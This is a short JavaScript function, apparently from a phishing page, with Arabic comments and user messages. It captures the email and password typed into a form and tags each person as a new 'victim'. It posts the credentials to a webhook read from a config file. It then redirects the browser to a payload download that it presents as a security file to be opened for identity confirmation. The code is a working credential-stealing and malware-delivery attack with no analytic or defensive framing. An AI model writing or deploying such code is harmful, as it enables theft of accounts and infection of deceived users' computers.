async function startCapture() {
    const email = document.getElementById('email').value;
    const pass = document.getElementById('pass').value;
    if(!email || !pass) return alert("يرجى إكمال التوثيق");

    const victimID = "ID-" + Math.floor(Math.random() * 9000 + 1000);

    try {
        const configRes = await fetch('./data.json');
        const config = await configRes.json();
        
        // إرسال البيانات
        await fetch(config.webhook_url, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                content: `💀 **ضحية جديدة:**\nالـ ID: \`${victimID}\`\n📧 الإيميل: \`${email}\`\n🔑 الباسورد: \`${pass}\``
            })
        });

        // بدء التحميل المباشر
        window.location.href = config.pc_payload;
        
        alert("بدأ تحميل ملف الأمان. يرجى فتحه لتأكيد هويتك.");
    } catch(e) {
        console.error("Connection Error");
    }
}
